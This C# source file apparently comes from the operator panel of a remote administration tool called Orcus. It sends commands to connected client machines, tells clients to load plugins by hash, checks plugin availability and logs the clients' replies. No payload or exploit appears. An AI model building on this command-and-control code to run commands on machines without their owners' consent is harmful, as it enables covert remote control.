using System;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Commands.ClientCommands;

namespace Orcus.Administration.Commands.ClientCommands
{
    public class ClientCommandsCommand : Command
    {
        private event EventHandler<CheckPluginAvailableEventArgs> ResponseCheckPluginAvailable;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((ClientCommandsCommunication) parameter[0])
            {
                case ClientCommandsCommunication.ResponseCommandSucceeded:
                    if (parameter.Length == 1)
                        LogService.Receive((string) Application.Current.Resources["StaticCommandExecutedSuccessfully"]);
                    else
                        LogService.Receive(Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1));
                    break;
                case ClientCommandsCommunication.ResponseCommandFailed:
                    if (parameter.Length == 1)
                        LogService.Error((string)Application.Current.Resources["StaticCommandFailedToExecute"]);
                    else
                        LogService.Error(Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1));
                    break;
                case ClientCommandsCommunication.ResponseCommandMessage:
                    switch ((MessageType) parameter[1])
                    {
                        case MessageType.Warning:
                            LogService.Warn(Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2));
                            break;
                        case MessageType.Error:
                            LogService.Error(Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2));
                            break;
                        case MessageType.Status:
                            LogService.Receive(Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2));
                            break;
                    }
                    break;
                case ClientCommandsCommunication.ResponseCheckPluginAvailable:
                    ResponseCheckPluginAvailable?.Invoke(this, new CheckPluginAvailableEventArgs(parameter[1] == 1, parameter.Skip(2).Take(16).ToArray()));
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public bool CheckPluginAvailable(byte[] pluginHash)
        {
            var data = new byte[17];
            data[0] = (byte) ClientCommandsCommunication.CheckIsPluginAvailable;
            Array.Copy(pluginHash, 0, data, 1, 16);

            bool result = false;

            using (var autoResetEvent = new AutoResetEvent(false))
            {
                EventHandler<CheckPluginAvailableEventArgs> eventHandler = null;
                eventHandler = (sender, args) =>
                {
                    if (args.PluginHash.SequenceEqual(pluginHash))
                    {
                        ResponseCheckPluginAvailable -= eventHandler;
                        result = args.IsAvailable;
                        autoResetEvent.Set();
                    }
                };
                ResponseCheckPluginAvailable += eventHandler;

                ConnectionInfo.SendCommand(this, data);

                autoResetEvent.WaitOne();
                return result;
            }
        }

        public void SendCommandWithPlugin(StaticCommand staticCommand, int pluginId, byte[] pluginHash)
        {
            var parameter = staticCommand.GetCommandParameter().Data;
            ConnectionInfo.UnsafeSendCommand(this, parameter.Length + 17, writer =>
            {
                writer.Write((byte) ClientCommandsCommunication.SendCommandWithPlugin);
                writer.Write(staticCommand.CommandId.ToByteArray());
                writer.Write(pluginHash);
                writer.Write(pluginId);
                writer.Write(parameter);
            });
            LogService.Send(string.Format((string) Application.Current.Resources["ExecuteStaticCommandAndLoadPlugin"],
                staticCommand.Name));
        }

        public void SendCommand(StaticCommand staticCommand)
        {
            var parameter = staticCommand.GetCommandParameter().Data;
            ConnectionInfo.UnsafeSendCommand(this, parameter.Length + 17, writer =>
            {
                writer.Write((byte) ClientCommandsCommunication.SendCommand);
                writer.Write(staticCommand.CommandId.ToByteArray());
                writer.Write(parameter);
            });
            LogService.Send(string.Format((string) Application.Current.Resources["ExecuteStaticCommand"],
                staticCommand.Name));
        }

        protected override uint GetId()
        {
            return 31;
        }
    }

    public class CheckPluginAvailableEventArgs : EventArgs
    {
        public CheckPluginAvailableEventArgs(bool isAvailable, byte[] pluginHash)
        {
            IsAvailable = isAvailable;
            PluginHash = pluginHash;
        }

        public bool IsAvailable { get; }
        public byte[] PluginHash { get; }
    }
}